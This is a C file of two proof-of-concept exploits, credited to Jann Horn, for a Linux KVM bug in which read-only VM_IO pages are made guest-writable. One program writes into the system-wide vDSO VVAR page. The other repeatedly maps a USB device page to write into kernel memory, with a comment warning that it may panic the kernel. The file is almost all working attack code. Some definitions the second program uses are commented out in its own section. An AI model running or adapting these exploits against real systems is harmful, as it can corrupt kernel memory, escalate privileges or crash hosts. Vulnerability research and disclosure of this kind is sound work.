/* @author Jann Horn                                                                               
 * at https://elixir.bootlin.com/linux/v5.10.11/source/arch/x86/entry/vdso/vma.c#L297 we map the   
 * VVAR page of the VDSO, which contains a struct vdso_data                                        
 * (https://elixir.bootlin.com/linux/v5.10.11/source/include/vdso/datapage.h#L90) that contains    
 * information about clock offsets and such (to allow ring 3 to figure out the current time using  
 * RDTSC without switching to kernel mode). this page is shared across the entire system so that if
 * the clock offset changes, it only has to be changed in one central location. the VVAR page is   
 * marked VM_IO so that the get_user_pages machinery keeps its paws off that page. but KVM's       
 * hva_to_pfn() is AFAICS going to first try get_user_pages, that will fail, then it notices that  
 * the VMA is VM_IO, goes down the hva_to_pfn_remapped path, and then I think that thing just grabs
 * the PFN with follow_pfn and forces the writable flag to true even though the PFN is read-only...
*/    

//gcc -o vvar_write vvar_write.c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/kvm.h>

/* for real mode */
static __attribute__((aligned(4096))) char guest_code[0x1000] = {
  0x89, 0x35, /* mov [di],si */
  0xcc, /* int3 */
};

static void create_region(int vm, int slot, unsigned long guest_phys, unsigned long host_addr, unsigned long size) {
  struct kvm_userspace_memory_region region = {
    .slot = slot,
    .guest_phys_addr = guest_phys,
    .memory_size = size,
    .userspace_addr = host_addr
  };
  if (ioctl(vm, KVM_SET_USER_MEMORY_REGION, &region))
    return;
}

int vvar_write_main(void) {
  FILE *mapsfile = fopen("/proc/self/maps", "r");
  if (mapsfile == NULL)
    return -1;
  unsigned long vvar_addr;
  while (1) {
    char buf[4096];
    errno = 0;
    if (fgets(buf, sizeof(buf), mapsfile) == NULL)
      return -1;
    if (strstr(buf, "[vvar]") == NULL)
      continue;
    vvar_addr = strtoul(buf, NULL, 16);
    break;
  }
  
  

  int kvm = open("/dev/kvm", O_RDWR);
  if (kvm == -1)
    return -1;
  int mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, 0);
  if (mmap_size == -1)
    return -1;

  int vm = ioctl(kvm, KVM_CREATE_VM, 0);

  if (ioctl(vm, KVM_SET_TSS_ADDR, 0x10000000UL))
    return -1;
  create_region(vm, 0, 0x0, (unsigned long)guest_code, 0x1000);
  create_region(vm, 1, 0x1000, vvar_addr, 0x1000);

  int vcpu = ioctl(vm, KVM_CREATE_VCPU, 0);

  struct kvm_run *vcpu_state = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu, 0);


  struct kvm_sregs sregs;
  if (ioctl(vcpu, KVM_GET_SREGS, &sregs))
    return -1;
  sregs.cs.selector = 0;
  sregs.cs.base = 0;
  struct kvm_regs regs = {
    .rdi = 0x1f00,
    .rsi = 0xf00d,
    .rip = 0x0,
    .rflags = 2
  };
  if (ioctl(vcpu, KVM_SET_SREGS, &sregs))
    return -1;
  if (ioctl(vcpu, KVM_SET_REGS, &regs))
    return -1;

  if (ioctl(vcpu, KVM_RUN, 0))
    return -1;

  
  return 0;
}

//gcc -o kernel_write kernel_write.c
/* @author Jann Horn */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/kvm.h>

/* for real mode */
// static __attribute__((aligned(4096))) char guest_code[0x1000] = {
//   0x89, 0x35, /* mov [di],si */
//   0xcc, /* int3 */
// };

// static void create_region(int vm, int slot, unsigned long guest_phys, unsigned long host_addr, unsigned long size) {
//   struct kvm_userspace_memory_region region = {
//     .slot = slot,
//     .guest_phys_addr = guest_phys,
//     .memory_size = size,
//     .userspace_addr = host_addr
//   };
//   if (ioctl(vm, KVM_SET_USER_MEMORY_REGION, &region))
//     return;
// }

int kernel_write_main(void) {
  sync(); /* in case we're about to panic the kernel... */

  char *usb_path = "/dev/bus/usb/001/001";
  int usb_fd = open(usb_path, O_RDONLY);
  if (usb_fd == -1)
    return -1;
  char *usb_mapping = mmap(NULL, 0x2000, PROT_READ, MAP_SHARED, usb_fd, 0);
  if (usb_mapping == MAP_FAILED)
    return -1;

  int kvm = open("/dev/kvm", O_RDWR);

  int mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, 0);


  int vm = ioctl(kvm, KVM_CREATE_VM, 0);

  if (ioctl(vm, KVM_SET_TSS_ADDR, 0x10000000UL))
    return -1;
  create_region(vm, 0, 0x0, (unsigned long)guest_code, 0x1000);

  int vcpu = ioctl(vm, KVM_CREATE_VCPU, 0);

  struct kvm_run *vcpu_state = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu, 0);


  while (1) {
    create_region(vm, 1, 0x1000, (unsigned long)usb_mapping+0x1000, 0x1000);
    struct kvm_sregs sregs;
    if (ioctl(vcpu, KVM_GET_SREGS, &sregs))
      return -1;
    sregs.cs.selector = 0;
    sregs.cs.base = 0;
    struct kvm_regs regs = {
      .rdi = 0x1f00,
      .rsi = 0xf00d,
      .rip = 0x0,
      .rflags = 2
    };
    if (ioctl(vcpu, KVM_SET_SREGS, &sregs))
      return -1;
    if (ioctl(vcpu, KVM_SET_REGS, &regs))
      return -1;

    if (ioctl(vcpu, KVM_RUN, 0))
      return -1;
    

    create_region(vm, 1, 0, 0, 0);
  }
}


int main(void){
  vvar_write_main();
  kernel_write_main();
  return 0;
}